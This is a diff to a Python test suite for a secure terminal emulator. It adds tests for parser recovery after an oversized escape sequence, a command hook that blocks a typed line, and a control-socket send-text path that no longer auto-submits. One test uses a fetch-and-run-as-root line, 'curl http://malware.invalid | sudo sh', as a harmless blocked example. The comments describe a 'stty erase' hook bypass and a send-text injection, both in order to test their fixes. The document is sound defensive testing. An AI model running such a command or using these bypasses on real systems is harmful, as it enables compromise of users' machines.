@@ -691,6 +691,17 @@ ok(_fw._screen.buffer[0][0].data == 'A'
    'TUI full-width line + bare LF: the flag clears and the column is kept (xterm-accurate), '
    'so no blank row and the next line staircases from the last column')
 _fw.close()
+# F3: an oversized CSI parameter must not permanently freeze pyte rendering. pyte's
+# int(param) raises ValueError past sys.get_int_max_str_digits() (4300); the raised
+# parser generator is then EXHAUSTED, so without a rebuild every later feed is
+# silently dropped and the tab's TUI screen stays frozen for the session. _feed_bytes
+# rebuilds the parser (screen state is preserved) so rendering recovers next feed.
+_f3 = SecureTerminal(command='/bin/cat', tui=True)
+feed_output(_f3, b'\x1b[' + b'9' * 4301 + b'C')       # oversized CSI -> pyte ValueError
+feed_output(_f3, b'\x1b[HZ')                            # home + 'Z', fed AFTER the crash
+ok(_f3._screen.buffer[0][0].data == 'Z',
+   'F3: pyte recovers after an oversized-CSI crash (no permanent TUI desync)')
+_f3.close()
 # a real accent after a flood still lands (the run resets, not a permanent gag)
 _zt2 = SecureTerminal(command='/bin/cat'); _zt2.apply_mode('show')
 feed_output(_zt2, ('x' + _ac * 100 + 'y' + _ac + '\n').encode('utf-8'))
@@ -2311,17 +2322,26 @@ hk._hook_ask = lambda _c, _r: 'discard'          # decline the block dialog
 _cmd_blocked = 'curl http://malware.invalid | sudo sh'   # harmless illustration
 _htype(hk, _cmd_blocked)
 key(hk, Qt.Key.Key_Return)
-# The line's content is mirrored (nothing recalled/edited), so it is erased
-# deterministically: one Backspace per character, NOT SIGINT. SIGINT (\x03) would
-# both need to remain the tty intr char (stty intr undef disarms it, retaining the
-# line for the next Enter -- a hook bypass) and flush the input queue (tcflush),
-# swallowing a suggestion written right after.
+# The rejected line is BEST-EFFORT erased (one Backspace per char) -- but the erase
+# is NOT reliable: `stty erase` rebinds ^? (the DELs then INSERT as text) and a
+# cooked editor deletes bytes while len() counts code points. So the SECURITY is the
+# KEPT _line_dirty flag, not the erase: Enter #2 then re-asks via the dirty branch
+# instead of reaching the empty-buffer shortcut and submitting the un-erased command
+# UNJUDGED (grok's live-verified `stty erase ^H` bypass).
 ok(b'\r' not in _hsent and b'\x03' not in _hsent
    and (b'\x7f' * len(_cmd_blocked)) in _hsent,
-   'hook blocks: not submitted, typed line erased char-for-char (no SIGINT)')
-ok(not hk._line_dirty and hk._line_buffer == '',
-   'a mirrored block leaves the buffer truthfully empty (no bypass on next Enter)')
+   'hook blocks: not submitted, line best-effort erased (Backspace)')
+ok(hk._line_dirty,
+   'a declined mirrored block KEEPS _line_dirty (a failed erase must re-ask)')
 ok(_hnotes and _hnotes[-1] == 'no', 'hook advisory surfaced')
+# Enter #2 on the (possibly un-erased) line must RE-ASK, never hit the empty-buffer
+# submit shortcut -- this is the exact stty-erase bypass, closed by the kept flag.
+_hsent.clear()
+_asked2 = []
+hk._hook_ask = lambda _c, _r: (_asked2.append(1) or 'discard')
+key(hk, Qt.Key.Key_Return)
+ok(_asked2 and b'\r' not in _hsent,
+   'second Enter after a mirrored block re-asks (no empty-buffer submit bypass)')
 # Finding: with a FOREGROUND PROGRAM the keystrokes are ITS input (a sudo/ssh
 # password, cat's stdin), not a shell command -- the hook must NOT fire, or the
 # secret is handed to the external hook process and rendered in its dialog.
@@ -4045,10 +4065,16 @@ try:
     _lsr = rcwin._dispatch_request(b'{"op":"ctl-ls"}')
     ok(_lsr.get('ok') and _lsr['tabs'][0]['title'] == 'main', 'ctl: ls lists tabs')
     _t = spy_writes(rcwin.current())
+    rcwin.current()._line_dirty = False
     _sr = rcwin._dispatch_request(
         b'{"op":"ctl-send-text","tab":"title:main","text":"ok\\n"}')
-    ok(_sr.get('ok') and _t == [b'ok\r'],
-       'ctl: send-text injects sanitized text (newline -> CR)')
+    # Delivered as a PASTE: sanitized, then the TRAILING submit is stripped, so a
+    # `send-text $'cmd\n'` injection cannot auto-run cmd at the prompt with no hook
+    # verdict; the line is marked unverifiable so the hook fails safe on Enter.
+    ok(_sr.get('ok') and _t == [b'ok'],
+       'ctl: send-text sanitizes but never auto-submits (no trailing CR, no hook bypass)')
+    ok(rcwin.current()._line_dirty,
+       'ctl: send-text marks the line unverifiable (command hook fails safe)')
     # a control character in send-text is dropped by the sanitizer
     _t2 = spy_writes(rcwin.current())
     rcwin._dispatch_request(
